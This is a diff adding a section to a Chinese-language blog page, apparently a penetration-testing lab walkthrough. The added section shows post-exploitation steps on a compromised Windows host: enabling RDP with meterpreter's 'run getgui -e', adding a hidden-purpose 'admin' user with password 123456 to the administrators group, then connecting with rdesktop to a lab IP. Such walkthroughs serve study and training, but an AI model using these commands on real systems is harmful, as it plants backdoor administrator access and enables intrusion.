@@ -233,6 +233,17 @@
 <p>反弹shell</p>
 <p>如果出现乱码的话可以执行chcp 65001</p>
 <p><img src="image-20211115104411116.png" alt="image-20211115104411116"></p>
+<h2><span id="远程连接">远程连接</span></h2><p>用meterpreter打开3389远程桌面端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run getgui -e</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211115142326527.png" alt="image-20211115142326527"></p>
+<p>然后shell进入系统，添加管理员用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">进入目录</span><br><span class="line">shell</span><br><span class="line">查看当前用户</span><br><span class="line">net user</span><br><span class="line">添加一个名为admin密码为123456的用户</span><br><span class="line">net user admin 123456 /add </span><br><span class="line">把admin用户添加到管理员组中</span><br><span class="line">net localgroup administrators admin /add</span><br></pre></td></tr></table></figure>
+
+<p>然后远程连接就OK</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.135.143</span><br><span class="line">(这个命令在操作终端执行)</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20211115142740943.png" alt="image-20211115142740943"></p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
